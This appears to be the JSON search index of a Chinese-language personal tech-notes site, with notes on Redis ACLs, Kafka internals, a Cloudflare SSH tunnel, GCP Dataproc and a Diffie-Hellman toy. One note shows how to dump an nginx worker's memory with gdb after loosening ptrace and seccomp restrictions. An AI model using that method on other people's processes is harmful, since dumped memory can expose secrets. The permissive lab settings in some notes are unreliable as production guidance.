redis\ndocker compose down -v &amp;&amp; docker compose up -d\n\n登入剛建立的 ACL 帳戶\n$ redis-cli\n127.0.0.1:6379&gt; auth stream_user YOUR_PASSWORD\nOK\n127.0.0.1:6379&gt;\n\nstream_user 有持久化保存\n\n測試未 acl save 就退出的情況\n\noptional - 預定義 user\n\n編輯 /redis-data/users.acl，加入預設使用者：\nuser stream_user2 on &gt;mypassword ~* +@all\n\n啟動 redis 後也能看到剛剛設定的 stream_user2\n\n結語\n透過 acl save 可以將 redis-cli session 期間建立的 user 持久化保存，也能透過預先定義的 user.acl 建立 user",
		"tags": [ "note","Redis","acl"]
},

{
		"title": "Redis stream 訂閱權限設定",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Redis/Redis stream 訂閱權限設定/",
		"content": "Redis ACL\nhttps://redis.io/docs/latest/operate/oss_and_stack/management/security/acl/\n建立 Stream\nRedis Stream 是「lazy creation」，也就是只要你往一個 key 寫入資料，它就會自動建立。\n建立一個名為 mystream 的 Stream\nXADD mystream * message &quot;Hello World&quot;\n\n* → 自動生成 ID（timestamp-based）\nmessage &quot;Hello World&quot; → 欄位與值，可以一次放多個欄位\n執行後，mystream 就存在了。\n\n列出所有 stream channel\nSCAN 0 TYPE stream\n\n建立只能訂閱 mystream 的使用者\n語法如下\nACL SETUSER stream_user on &gt;StrongPassword +XREAD +XREADGROUP +XRANGE +XINFO ~{{YOUR_STREAM_NAME}}\n\nexample:\nACL SETUSER stream_user on &gt;YOUR_PASSWORD +XREAD +XREADGROUP +XRANGE +XINFO ~mystream\n\n[!NOTE]\nstream_user → 新使用者名稱\non → 啟用帳號\nYOUR_PASSWORD → 密碼\n+XREAD +XREADGROUP +XRANGE +XINFO → 允許讀取 Stream 的命令\n~my-stream → 只允許存取這個 key，其他 Stream key 都不能存取。\n\n使用受 ACL 權限控管的使用者連線到 Redis\nredis-cli -u redis://stream_user:YOUR_PASSWORD@127.0.0.1:6379\n\n連線後只要操作 my-stream 可以成功，其他 Stream key 會出現權限錯誤：\nXREAD COUNT 1 STREAMS mystream 0 # 成功 XREAD COUNT 1\nSTREAMS other-stream 0 # 失敗 -&gt; No Permissions to access a key\n\n最後記得 acl save 持久化保存\n如何做 ACL 持久化請參閱\n<a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/Redis/Redis ACL 持久化/\">Redis ACL 持久化</a>",
		"tags": [ "note","Redis","redis-stream","auth","acl"]
},

{
		"title": "Consumer offset reset 行為",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Consumer offset reset 行為/",
		"content": "情境\n\nconsumer 預期會從 kafka 持續讀取 log，但如果 consumer crash，kafka 會保存 commited offset 7 天\n也說明，若 consumer 停機超過 7 天，之前消費的位置將會被重置\n參數\n\nauto.offset.reset=latest: 會從 kafka topic 最末端讀取 log\nauto.offset.reset=earliest: 從最早的地方開始讀 log\nauto.offset.reset=none: 若沒有 offset 資訊，將會拋出 exception\n\n重播 log 給 consumer\n\n步驟如下:\n\n關閉該 consumer group 底下所有的 consumer\n使用 kafka-consumer-groups 重置你想重置的 offset 位置\n重啟 consumer\n\nJava code\n透過 addShutdownHook 偵測 shutdown event\n...\n// get a reference\nfinal Thread mainThread = Thread.currentThread();\n\nRuntime.getRuntime().addShutdownHook(new Thread(){\npublic void run(){\nlog.info(&quot;Detected a shutdown event&quot;);\nconsumer.wakeup();\n\ntry {\nmainThread.join();\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n}\n});\n...\ntry(openSearchClient; consumer){\nboolean indexExists = openSearchClient.indices().exists(new GetIndexRequest(indexName), RequestOptions.DEFAULT);\nif (!indexExists){\n// we need to create the index on opensearch if it doesn't exist already\nCreateIndexRequest createIndexRequest = new CreateIndexRequest(indexName);\nopenSearchClient.indices().create(createIndexRequest, RequestOptions.DEFAULT);\nlog.info(&quot;The wikimedia index has been created&quot;);\n} else {\nlog.info(&quot;The wikimedia index already exists&quot;);\n}\n\nwhile (true){\nConsumerRecords&lt;String, String&gt; records = consumer.poll(Duration.ofMillis(3000));\n\nint recordCount = records.count();\nlog.info(&quot;Received &quot; + recordCount + &quot; record(s)&quot;);\nBulkRequest bulkRequest = new BulkRequest();\nfor (ConsumerRecord&lt;String, String&gt; record : records){\ntry{\nString id = extractId(record.value());\n// send the record into opensearch\nIndexRequest indexRequest = new IndexRequest(indexName)\n.source(record.value(), XContentType.JSON)\n.id(id);\n//IndexResponse indexResponse = openSearchClient.index(indexRequest, RequestOptions.DEFAULT);\nbulkRequest.add(indexRequest);\n} catch (Exception e){\n\n}\n}\nif (bulkRequest.numberOfActions() &gt; 0){\nBulkResponse bulkResponse = openSearchClient.bulk(bulkRequest, RequestOptions.DEFAULT);\nlog.info(&quot;Inserted &quot; + bulkResponse.getItems().length + &quot; record(s).&quot;);\ntry {\nThread.sleep(1000);\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n\n}\n\nconsumer.commitAsync();\nlog.info(&quot;offset have been committed!&quot;);\n}\n} catch (WakeupException e){\nlog.info(&quot;Consumer is starting to shutdown&quot;);\n} catch (Exception e){\nlog.error(&quot;unexpected exception: &quot;, e);\n} finally {\nconsumer.close(); // close the consumer, this will also commit offest to kafka.\nopenSearchClient.close();\nlog.info(&quot;The consumer is now gracefully shut down&quot;);\n}",
		"tags": [ "note","kafka","java"]
},

{
		"title": "Kafka Topic Availability",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka Topic Availability/",
		"content": "Producer ACK 機制說明\n\nACK = 0\n\nCase: 發送速度最快，但資料丟失風險最大\n只要發送成功就繼續發送下一筆\n\nACK = 1\n\nCase: 剛剛好的發送速度，適合日常一般資料使用，有部分資料丟失風險\nLeader Partition 回傳 ACK 就算成功\n\nACK = all (搭配)\n\nCase: 希望資料不要丟失，可以考慮這個設置\n需要 Partition 副本組內指定 min.insync.replicas 數量的 replica ACK，訊息才會 ACK\n\nmin.insync.replicas = 1 -&gt; Leader ACK 就成功\nmin.insync.replicas = 2 -&gt; Leader + replica 兩個 ACK 就成功",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka consumer group 與 rebalance 機制",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka consumer group 與 rebalance 機制/",
		"content": "Topic 可以切分多個 Partition\n\n一個 consumer 可以訂閱多個 Partition\n\n每個 consumer 都可以訂閱 Topic 內所有的 partition\n\n多個 Consumer 可以組成一個 Consumer group\n\n同個 Consumer group 內共享 Topic 內所有的 Partition\n一個 consumer 就會訂閱所有的 Partition\n\n兩個 consumer 分散訂閱 Partition\n\n三個 consumer 就會一個 consumer 訂閱一個 partition，均分所有的 Partition\n\n若 consumer 數量 &gt; Partition 數量，多餘的 Consumer 就會 Disable\n\n以 UI 介面為例\nConsumer group: my-java-application\n\n訂閱了一個 Topic，並且擁有兩個 Member\n\n並且從 Assigned partitions 可以得知，總共有三個 Partition\nclient id 為 b52ac033-cf4b-49d2-8a13-78ea6b4e1cf1 的 consumer 分到 1 個 partition\nclient id 為 5545bc61-e3fd-4f2f-a0d7-fc7d77d1ddcc 的 consumer 分到 2 個 partition\n\n查詢 consumer group 裡面的 member 目前訂閱哪個 Topic，與每個 member 訂閱的 Partition 有哪些\n$ kafka-consumer-groups --bootstrap-server localhost:19092 --group my-java-application --describe\n\n案例實作\nTopic: demo_java\nPartition: 3\n$ kafka-topics.sh --bootstrap-server localhost:19092 --topic demo_java --describe\n\nCase 1: 只有一個訂閱者\nCONSUMER-ID: consumer-my-java-application-1-c478a360-25f4-4cd8-8a13-158f0b960d71 (訂閱三個 partition)\n\nCase 2: 兩個訂閱者\nconsumer-my-java-application-1-a2c4de74-999b-4898-a0e3-b2f165a37a75 訂閱 id: 0,1 partition\nconsumer-my-java-application-1-c478a360-25f4-4cd8-8a13-158f0b960d71 訂閱 id: 2 partition\n\nCase 3: 三個訂閱者(一個 Partition 對應一個 consumer)\n\nCase 4: 四個訂閱者(訂閱者數量 &gt; Partition 數量)\nConsumer 0 未被分配到任一個 Partition\n\nRebalance 機制\n每次 Rebalance 都需要 Broker 參與，但不是每台 Broker 都需要參與 Rebalance 的行為，只有 Coordinator Broker 才需要\n透過以下指令查詢 Coordinator Broker\n$ kafka-consumer-groups.sh --bootstrap-server localhost:19092 --group my-java-application --describe --state\n\n以這次案例來說，group: my-java-application 的 Coordinator Broker 是 localhost:19092\n觀察每次新建 consumer 都會產出的 Log\nRequest joining group due to: group is already rebalancing\nRevoke previously assigned partitions demo_java-1\n\n(Re-)joining group\n\nSuccessfully joined group with generation Generation{generationId=34, memberId='consumer-my-java-application-1-a2c4de74-999b-4898-a0e3-b2f165a37a75', protocol='range'}\n\nNotifying assignor about the new Assignment(partitions=[demo_java-2])\nAdding newly assigned partitions: demo_java-2\nSetting offset for partition demo_java-2 to the committed offset FetchPosition{offset=959, offsetEpoch=Optional[1], currentLeader=LeaderAndEpoch{leader=Optional[localhost:19092 (id: 0 rack: null)], epoch=absent}}\n\nLog\n解釋\n\nRequest joining group due to: group is already rebalancing\nGroup 在 rebalance，consumer 需要重新加入 group。\n\nRevoke previously assigned partitions demo_java-1\nCoordinator 通知 consumer 放棄目前持有的 partition，準備進入下一輪分配。\n\n(Re-)joining group\nconsumer 正在重新加入 group，等待 coordinator 分配。\n\nSuccessfully joined group with generation...\nconsumer 正式加入 group，獲得 generationId 與 memberId。\n\nNotifying assignor about the new Assignment(...)\nconsumer client 收到 coordinator 的分配結果，更新要訂閱的 partition\n\nAdding newly assigned partitions: demo_java-2\n新一輪 rebalance 分配到了 demo_java-2。\n\nSetting offset for partition demo_java-2 to the committed offset...\nconsumer 讀取起點設定為 partition 目前已 commit 的 offset（本例為 959）。\n\n[!TIP]\nGeneration 用於追蹤目前 Group 的狀態，避免舊的成員提交 offset，只有新成員能提交 Partition offset",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka key hashing",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka key hashing/",
		"content": "Producer 預設的 Partition 邏輯使用 murmur2 進行邏輯分區，需要輸入 key，再根據 key 去切分此筆 message 該去哪個 partition，這帶來一個好處，只要是相同的 key，那他的分區位置就是可預測的，並且 kafka 保證分區內的 message 是有序性的，這點用於序列化資料是很重要的。\n\n[!CAUTION]\n若使用 kafka key 有序性分區，當新增 partition 時，會打破原本的分區規則\n\n若因業務需求無法擴張 partition 數量，例如交易資料需要有序性，可以增加 broker 數量\n此論點依據為\n\nLeader partition 會重新分散到更多 broker\n假設：\n- 3 partitions\n- 3 brokers\n\n每個 broker 當 1 個 leader\n現在變成：\n\n3 partitions\n6 brokers\n\nLeader 還是 3 個沒錯，但 follower replicas 會被分散",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka leader partition 機制研究",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka leader partition 機制研究/",
		"content": "leader partition 概念\n每個 Topic 可以有多個 Partition\n每個 Partition 都是一個 Partition 副本組\n每個 Partition 副本組可以有多個 replication\n每個 Partition 副本組會決定誰是 leader partition\n\ntopic = 多個 partition 副本組的集合\n每個 Partition 都會有一個 Leader 與零個或多個 followers(副本)\nkafka 分片分配規則\n\n在同個 topic 中，每個 partition 副本組的 leader 分片會儘量分散到每個 Broker\n一台 broker 可以同時擔任多個 partitions 副本組的 leader",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)/",
		"content": "背景故事\n\nkafka 在新版本引入Cooperative Rebalance(增量 Rebalance)機制\n在過去版本中，只要 consumer 斷線，就會觸發 rebalance，會停止所有 consumer 的訂閱流\nCooperative Rebalance 就是為了解決這個問題\n以下是具體流程\n\n停止 consumer 1 對 Partition 2 的訂閱\n\n過一段時間， kafka 會重新 Assign Partition 2 給 Consumer 2(new consumer)\n\n[!IMPORTANT] Cooperative Rebalance 好處\n其他 Consumer 還是可以持續訂閱，不會中斷\n\nHow to use?\nkafka consumer 可以設定 partition.assignment.strategy",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka rebalance 機制 - Eager Rebalance",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka rebalance 機制 - Eager Rebalance/",
		"content": "Eager Rebalance(此 rebalance 會造成世界停止)\n\n停止 consumer 訂閱\n\n分配完重新開始訂閱\n\n[!IMPORTANT]\n\nconsumer 在 rebalance 後，不一定能再次訂閱到之前的 Partition\n在世界停止期間，所有 consumer 訂閱會停止\n\nRebalance 機制詳解\n\n初始狀態\n\n新的 consumer 加入\n\n通知 kafka cluster 的 Coordinator broker 進行 Rebalancing\n\nCoordinator broker 通知 consumer 斷開已連線的 partition\n\n開始 Rebalancing\n\nCoordinator broker 隨機選出一個 consumer 做為 Leader Consumer\n\nLeader Consumer 從 Coordinator broker 取得 consumer group info\n\nLeader Consumer 的責任是：\n\n收集所有消費者的訂閱資訊 (subscription)。\n根據分配策略 (Range, RoundRobin, Sticky 等) 計算 partition → consumer 的映射。\n將分配結果提交給 Coordinator。\n\nCoordinator 再把這個分配結果下發給所有消費者，完成 rebalance。\n\n完成 rebalance",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka 冪等 Producer",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka 冪等 Producer/",
		"content": "冪等定義\n冪等 = 同一個操作，執行一次或執行多次，結果都一樣。\n不論你做 1 次、10 次、100 次，\n系統的最終狀態必須一模一樣。\nkafka 重複 message 問題\n若 ack 消息回傳期間網路中斷\nProducer 就不會收到 ACK 通知，就會觸發 Retry 機制\n造成訊息重複發送的情況",
		"tags": [ "note","kafka"]
},

{
		"title": "kafka  topic 實驗",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/kafka  topic 實驗/",
		"content": "#kafka\n環境設定\ndocker-compose.yaml\nversion: '2.1'\nservices:\nzoo1:\nimage: confluentinc/cp-zookeeper:7.3.2\nhostname: zoo1\ncontainer_name: zoo1\nports:\n- &quot;2181:2181&quot;\nenvironment:\nZOOKEEPER_CLIENT_PORT: 2181\nZOOKEEPER_SERVER_ID: 1\nZOOKEEPER_SERVERS: zoo1:2888:3888\n\nkafka1:\nimage: confluentinc/cp-kafka:7.3.2\nhostname: kafka1\ncontainer_name: kafka1\nports:\n- &quot;9092:9092&quot;\n- &quot;29092:29092&quot;\n- &quot;9999:9999&quot;\nenvironment:\nKAFKA_ADVERTISED_LISTENERS: INTERNAL://kafka1:19092,EXTERNAL://${DOCKER_HOST_IP:-127.0.0.1}:9092,DOCKER://host.docker.internal:29092\nKAFKA_LISTENER_SECURITY_PROTOCOL_MAP: INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT,DOCKER:PLAINTEXT\nKAFKA_INTER_BROKER_LISTENER_NAME: INTERNAL\nKAFKA_ZOOKEEPER_CONNECT: &quot;zoo1:2181&quot;\nKAFKA_BROKER_ID: 1\nKAFKA_LOG4J_LOGGERS: &quot;kafka.controller=INFO,kafka.producer.async.DefaultEventHandler=INFO,state.change.logger=INFO&quot;\nKAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1\nKAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR: 1\nKAFKA_TRANSACTION_STATE_LOG_MIN_ISR: 1\nKAFKA_JMX_PORT: 9999\nKAFKA_JMX_HOSTNAME: ${DOCKER_HOST_IP:-127.0.0.1}\nKAFKA_AUTHORIZER_CLASS_NAME: kafka.security.authorizer.AclAuthorizer\nKAFKA_ALLOW_EVERYONE_IF_NO_ACL_FOUND: &quot;true&quot;\ndepends_on:\n- zoo1\n\ndocker compose up -d\n\ndocker exec -it kafka1 bash\n\n刪除 JMX env\nunset JMX_PORT &amp;&amp; unset KAFKA_JMX_OPTS\n\n建立一個 topic\nkafka-topics --create --topic quickstart-events --bootstrap-server localhost:9092\n\n檢查 topic 詳情\nkafka-topics --describe --topic quickstart-events --bootstrap-server localhost:9092\n\n建一個 producer\nkafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092\n\n查看目前 topic 有多少 message, 顯示的是 offset 的值\n$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic quickstart-events\nquickstart-events:0:16\n\n$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic filebeat\nfilebeat:0:0\n\n建立一個 訂閱者，訂閱 quickstart-events\nkafka-console-consumer --topic quickstart-events --from-beginning --bootstrap-server localhost:9092\n\n測試 kafka consumer group 消費機制\nkafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092 --group 1\n\n同一個 group 只會有一個 consumer 會消費到一個 topic 的訊息\n\n顯示目前 kafka 有多少 topic\n[appuser@kafka1 ~]$ kafka-topics --list --bootstrap-server localhost:9092\n__consumer_offsets\nfilebeat\nmetricbeat\nmy_group2_v2\nquickstart-events",
		"tags": ["kafka", "note","kafka"]
},

{
		"title": "kafka 高效率傳輸設定",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/kafka 高效率傳輸設定/",
		"content": "訂閱 kafka 消息\nkafka-console-consumer --bootstrap-server 127.0.0.1:19092 --topic wikimedia.recentchange\n\n高效率傳輸時，可考慮以下設定\n\nmax.in.flight.requests.per.connection\n\n每個 producer 在 broker 回覆 ack 前，最多送幾筆訊息出去\n若設定 = 1\n\n訊息只會一筆一筆發，會降低效率，但好處是，若訊息需要嚴格的排序(有新增 sort key)，那很重要\n\nlinger.ms\n\n等待一段 linger.ms，在此期間收到的消息都放在自己的暫存區，若 broker 批處理(batch.size)在 linger.ms 到達之前填滿，則立即批處理暫存區內的訊息，否則達到 linger.ms 才進行批處理\n\ncompression.type\n\n批處理參數，用於 broker 端壓縮訊息使用的算法(e.g. lz4、zstd、gzip...etc)\n\nbatch.size\n\n批處理的單筆 message 大小，若超過，則立即處理該訊息",
		"tags": [ "note","kafka"]
},

{
		"title": "Cloudflare tunnel 研究",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/other/Cloudflare tunnel 研究/",
		"content": "目的\n手上有一台 respberry pi 3 b+\n想在外網使用 ssh 連入進行個人機開發 or 實驗\n參考網站\nhttps://developers.cloudflare.com/cloudflare-one/connections/connect-networks/use-cases/ssh/ssh-cloudflared-authentication/?utm_source=chatgpt.com\n流程解釋(來自官網)\n使用者可以透過在原生終端機中驗證 cloudflared ，連接到 SSH 伺服器，而無需 WARP 客户端。 此方法需要伺服器和客户端兩者都已安裝 cloudflared ，以及 Cloudflare 上的活躍 Zone。 流量會透過此連線被 Proxy，使用者會使用 Cloudflare Access 憑證登入伺服器。\n來到 cloudflare Overview/Tunnels 按下「新增通道」\n\n使用 Cloudflared 的方案\n\n設定通道名稱\n\n選擇 Respberrry pi 的 Debian 作業系統的選項\n\n複製安裝指令\n\nssh 登入到本地的 Respberry pi 機器\n並貼上安裝指令碼\n\n安裝後啟動 cloudflared 服務\n\n註冊完成\n\ncloudflare 儀表板已出現註冊的機器\n\n按「下一步」\n\n輸入下列資訊，並按下「完成設定」\n\n現在已建立完通道，主機端連線設定已完成\n\nclient 連線端設定\n參考資料: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/#macos\nmac 上面安裝\nbrew install cloudflared\n\n在 SSH 設定檔中變更：\nvim ~/.ssh/config\n\n輸入以下值\nmy-ssh.xxx.ltd 為此次 tunnel 的位置\nHost my-ssh.xxx.ltd\nProxyCommand /usr/local/bin/cloudflared access ssh --hostname %h\n\n連線成功\n\n切換網路到外網環境\n\n一樣是可以連線到 my-ssh.xxx.ltd 的 ssh 機器",
		"tags": [ "note","cloudflare","tunnel"]
},

{
		"title": "GCP dataproc 運行 python scripts",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/pySpark/GCP dataproc 運行 python scripts/",
		"content": "建立 dataproc cluster\ngcloud dataproc clusters create jason-test-spark-job \\\n--region=us-central1 \\\n--properties='^#^dataproc:conda.packages=google-cloud-storage==2.18.2#yarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928'\n\nproperties\n在 package 裡面安裝 python package\ndataproc:conda.packages=google-cloud-storage==2.18.2\n指定 memory 使用量\nyarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928\npyspark pip install\n\n建立\nrequirements.txt\n\npytest==6.2.5\npyspark==3.2.0\ngoogle-cloud-storage==1.43.0\nmlflow==1.23.0\n\n寫 pip init 腳本\npip_init.py\n\n#!/bin/bash\n# 1. 確認 requirements.txt 文件是否已經上傳到 GCS 並下載到本地\nGCS_BUCKET_PATH=&quot;gs://dataproc-staging-us-central1-473678078038-tw1bdolx/requirements.txt&quot;\n\nLOCAL_PATH=&quot;/tmp/requirements.txt&quot;\n\n# 下載 requirements.txt\ngsutil cp ${GCS_BUCKET_PATH} ${LOCAL_PATH}\n\n# 使用 pip 安裝依賴\npip install -r ${LOCAL_PATH}\n\n上傳檔案\n\ngsutil cp requirements.txt gs://dataproc-staging-us-central1-473678078038-tw1bdolx/\ngsutil cp pip_init.sh gs://dataproc-staging-us-central1-473678078038-tw1bdolx/\n\n刪除原本的 cluster\ngcloud dataproc clusters delete jason-test-spark-job --region=us-central1\n\n建立 cluster 時運行腳本\n\ngcloud dataproc clusters create jason-test-spark-job \\\n--region=us-central1 \\\n--initialization-actions=gs://dataproc-staging-us-central1-473678078038-tw1bdolx/pip_init.sh\n\nDelete cluster\ngcloud dataproc clusters delete jason-test-spark-job --region=us-central1\nSubmit job\ngcloud dataproc jobs submit pyspark test.py --region=us-central1 --cluster jason-test-spark-job\n\n[!IMPORTANT]\n記得要切換 GCP 環境 (SIT/UAT/PROD)\n\n#python #pyspark #spark #cluster",
		"tags": ["python", "pyspark", "spark", "cluster", "note","pyspark"]
},

{
		"title": "使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學/",
		"content": "主旨\n本教學示範如何透過 Linux 的 pmap、/proc/&lt;pid&gt;/smaps 與 gdb 取得指定 process 的匿名記憶體區段，並導出成 dump 檔供後續分析。\n\n0. 找出 nginx process\n\n1. 找出記憶體佔用最高的區段\n首先使用 pmap 檢查 Nginx worker 的 memory map，並依 RSS 由大到小排序：\n$ pmap -x 135 | sort -k 3 -n -r | head -3\ntotal kB 2709340 412896 407496\n00007fe347600000 468992 393644 393644 rw--- [ anon ]\n00007fe3423ee000 5632 3860 3860 rw--- [ anon ]\n\n重點：\n\nRSS 欄位表示實際佔用的實體記憶體。\n第一筆最大者：00007fe347600000，RSS 約 393MB。\n標記為 [ anon ]，通常代表匿名 mmap 或 GC heap、buffer、cache 等。\n\n2. 用 smaps 確認該地址區段的完整範圍\npmap 顯示的是區段起始地址，但實際區段長度需從 smaps 查詢。\n$ cat /proc/135/smaps | grep 7fe347600000\n7fe34296e000-7fe347600000 r--s 00000000 00:36 2640400 /data/nginx/ip2proxy/PX2_CUSTOMER.mmdb\n7fe347600000-7fe364000000 rw-p 00000000 00:00 0\n\n解讀：\n\n第一段：7fe34296e000-7fe347600000 是 memory-mapped file (PX2_CUSTOMER.mmdb)\n第二段：7fe347600000-7fe364000000 是匿名記憶體 (rw-p ... 0)\n這就是 pmap 顯示為 [ anon ] 的那一段。\n\n因此要 dump 的實際區段範圍為：\nstart: 0x7fe347600000\nend: 0x7fe364000000\n\n3. 使用 gdb attach 進程\n進入 gdb：\n$ gdb -pid 135\n若出現權限問題，需確認：\n\n容器需加上 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined\n\n或需在宿主機設置 kernel.yama.ptrace_scope=0\n\n4. 在 gdb 裡 dump 出記憶體檔案\n進入 gdb 之後，執行：\n(gdb) dump memory /tmp/memdump_1 0x7fe347600000 0x7fe364000000\n說明：\n\n/tmp/memdump_1 為輸出檔案路徑\n\n開始地址與結束地址對應 smaps 的匿名記憶體範圍\n\n假如 dump 成功，會在 /tmp 看到數百 MB 至數 GB 的檔案。\n\n5. 後續分析 dump 檔案\n\n讀取可見字串：\n\n$ strings /tmp/memdump_1 | less",
		"tags": [ "note","nginx","linux","gdb"]
},

{
		"title": "安裝 Obsidian 語意搜尋套件",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/安裝 Obsidian 語意搜尋套件/",
		"content": "Plugin repo: https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo\n在 Settings -&gt; Community plugins -&gt; Browse\n\n搜尋 Semantic Search\n\n安裝套件\n\n啟用 Semantic 套件\n\n安裝 ollama\nhttps://ollama.com/download\n下載 embeding model\nollama pull nomic-embed-text\n\n檢查 model 是否有安裝成功\n$ ollama list\nNAME ID SIZE MODIFIED\nnomic-embed-text:latest 0a109f422b47 274 MB About an hour ago\n\n參數名稱\n設定值\n\nAPI URL\nhttp://localhost:11434/api/embed\n\nModel\nnomic-embed-text\n\n設定參數\n\n打開 command palette\n\n按照以下順序執行\n\n之後就可以用這個進行語意搜尋\n\n整體語意搜尋結果還不錯\n\n總結\n透過這個 obsidian 工具，可以做到語意級別的模糊搜尋，有時候可能就是模糊的感覺，沒有明確的關鍵字，就可以考慮用這個搜尋工具進行搜尋。",
		"tags": [ "note","obsidian"]
},

{
		"title": "密碼學 - 零知識證明 - 密鑰協商",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/密碼學 - 零知識證明 - 密鑰協商/",
		"content": "範例程式(Diffie-Hellman 方法)\n讓我們用密碼學最常用的人名 Bob 與 Alice 舉例\nBob 端\nimport random\n# Diffie-Hellman\np = 23 # 公開參數\ng = 5 # 公開參數\n\nbob_private = random.randint(1, p-1)\nbob_public = (g ** bob_private) % p # 2\nprint(&quot;Bob 的公開值：&quot;, bob_public)\n\nalice_public = int(input(&quot;請輸入 Alice 的公開值: &quot;))\nbob_shared = (alice_public ** bob_private) % p\nprint(&quot;Bob 計算的共享密鑰：&quot;, bob_shared)\n\nAlice 端\nimport random\np = 23 # 公開參數\ng = 5 # 公開參數\n\nalice_private = random.randint(1, p-1)\nalice_public = (g ** alice_private) % p # 8\nprint(&quot;Alice 的公開值：&quot;, alice_public)\n\nbob_public = int(input(&quot;請輸入 Bob 的公開值: &quot;))\nalice_shared = (bob_public ** alice_private) % p\nprint(&quot;Alice 計算的共享密鑰：&quot;, alice_shared)\n\n只要輸入對方的公開數，就能計算出共享密鑰\n\n重放攻擊\n# Eve 已知 g, p, alice_public\np = 23 # 公開參數\ng = 5 # 公開參數\nalice_public = 12\n\n# Eve 嘗試所有可能的私鑰\nfor possible_private in range(1, p):\nif (g ** possible_private) % p == alice_public:\nprint(&quot;Alice 的私鑰是：&quot;, possible_private)\nbreak\n\n離散對數問題\n在正常情況下，Eve（攻擊者）無法輕易算出 Alice 的私鑰，這正是 Diffie-Hellman 密鑰交換的安全基礎。\n原因如下：\nAlice 的公開值是：alice_public = (g ** alice_private) % p\nEve 想要知道 alice_private，必須解「離散對數問題」：已知 g、p、alice_public，求 alice_private\n這個問題在大質數下是非常困難的（目前沒有有效的演算法），所以只要 p 夠大，Alice 的私鑰就很安全\n但如果 p 很小（像教學範例 p=23），Eve 可以用暴力法：\n這種方法只適用於 p 很小的情況。\n實務上 p 至少要 2048 位元，這樣 Eve 幾乎不可能算出 Alice 的私鑰。\n總結：\np 小時，Eve 可以暴力破解 Alice 的私鑰\np 夠大時，Eve 幾乎不可能算出 Alice 的私鑰\n這就是 Diffie-Hellman 的安全基礎\n安全質數\n選用夠大的「安全質數」可以防止離散對數被暴力攻擊\nhttps://datatracker.ietf.org/doc/html/rfc3526#section-2",
		"tags": [ "note","技術研究","演算法"]
},

{
		"title": "技術筆記",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/",
		"content": "just 技術筆記",
		"tags": [ "note","gardenEntry"]
}
]